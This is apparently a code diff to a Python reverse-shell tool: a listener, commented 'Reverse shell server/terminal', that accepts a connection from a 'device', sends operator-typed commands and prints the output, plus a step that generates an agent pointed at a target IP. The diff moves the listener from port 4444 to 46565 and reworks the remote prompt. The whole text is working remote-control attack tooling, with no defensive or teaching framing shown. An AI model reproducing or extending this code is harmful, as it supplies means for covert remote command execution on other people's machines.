@@ -75,7 +75,7 @@ class RemoteClient(object):
         #Reverse shell server/terminal
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server.bind(("0.0.0.0", 4444))
+        self.server.bind(("0.0.0.0", 46565))
 
     def waitForDevice(self):
         self.server.listen(5)
@@ -83,12 +83,10 @@ class RemoteClient(object):
         print(f"Connection from {self.address} has been established!")
 
         while True:
-            self.client.send(b'pwd')
-            response: str = self.client.recv(1024).decode()[1:]
-            response = response[0].upper() + response[1:]
-            #Insert a : after the first char
-            response = response[:1] + ":" + response[1:]
-            cmd = input(f"(Remote) {response}> ".replace('\n',''))
+            self.client.send(b'cd')
+            cDir = self.client.recv(8064).decode()
+            cmd = input(f"{cDir} > ")
+
             if cmd == "exit":
                 break
             self.client.send(cmd.encode())
@@ -122,7 +120,7 @@ class RemoteShell(object):
         myip = self.getMyIpV4()
         target_ip = input(f"Target IP ({myip}): ")
         if target_ip == "": target_ip = myip
-        agent     = NewAgent(target_ip, 4444)
+        agent     = NewAgent(target_ip, 46565)
         agent.generate_agent(terminal.install_path)
 
     @commands.requestTerminalRefrence
